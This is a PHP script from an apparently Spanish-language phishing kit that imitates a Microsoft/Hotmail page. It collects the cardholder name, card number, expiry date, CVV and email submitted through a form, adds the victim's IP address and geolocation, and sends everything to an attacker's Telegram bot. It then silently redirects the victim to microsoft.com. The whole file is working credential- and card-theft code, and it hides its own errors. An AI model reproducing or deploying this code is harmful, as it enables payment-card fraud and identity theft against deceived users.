<?php
// 🚫 Ocultar errores y advertencias
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// 🔐 Iniciar sesión con control de errores
@session_start();

// 🔐 Requerir configuración protegida
require_once 'dat.php';

// 🔐 Incluir geolocalización (suponemos también seguro)
@include 'geoplugin.php'; // usa @include para evitar errores visibles si falta

$sendtotelegram = "yes";

// ✅ Obtener IP real del usuario (prevención contra headers falsos)
$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$user_ip = explode(',', $user_ip)[0];
$user_ip = trim($user_ip);

// 🌍 Obtener datos de ubicación desde ipinfo
function get_ip_info($user_ip) {
    $url = "https://ipinfo.io/" . urlencode($user_ip) . "/json";
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 2,
    ]);
    $response = curl_exec($ch);
    if (curl_errno($ch)) return null;
    curl_close($ch);
    return json_decode($response, true);
}

$locationData = get_ip_info($user_ip);
$cc = $locationData['country'] ?? 'Desconocido';
$city = $locationData['city'] ?? 'Desconocido';
$region = $locationData['region'] ?? 'Desconocido';

// 🛡️ Validación de POST
if (
    isset($_POST['name2'], $_POST['car2'], $_POST['mes2'], $_POST['anio2'], $_POST['cvv2']) &&
    is_string($_POST['name2']) && is_string($_POST['car2'])
) {
    $_SESSION['tarjeta'] = 'enviada';

    // 💬 Armar mensaje
    $uzer = $_POST['uzer'] ?? 'Desconocido';

    $message = "🔥Tarjeta Hotmail #2🔥\n\n";
    $message .= "👤 Titular.: `" . htmlspecialchars($_POST['name2']) . "`\n";
    $message .= "💳 Número.:  `" . htmlspecialchars($_POST['car2']) . "`\n";
    $message .= "📅 Vence.:  `" . htmlspecialchars($_POST['mes2']) . "/" . htmlspecialchars($_POST['anio2']) . "`\n";
    $message .= "🔐 CVV.:  `" . htmlspecialchars($_POST['cvv2']) . "`\n\n";
    $message .= "✉️ Correo asociado.:  `" . htmlspecialchars($uzer) . "`\n\n";
    $message .= "🌍 Ubicación.: " . $cc . " - " . $region . " - " . $city . "\n";
    $message .= "💻IP.: " . $user_ip . "\n";

    // 📤 Enviar por Telegram
    if ($sendtotelegram === "yes" && !empty($bot_url) && !empty($chat_id)) {
        $send = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        $telegram_api = "https://api.telegram.org/bot" . $bot_url . "/sendMessage";

        $ch = curl_init($telegram_api);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $send,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

// 🔁 Redirigir al final
header('Location: https://www.microsoft.com/en-us/');
exit;

?>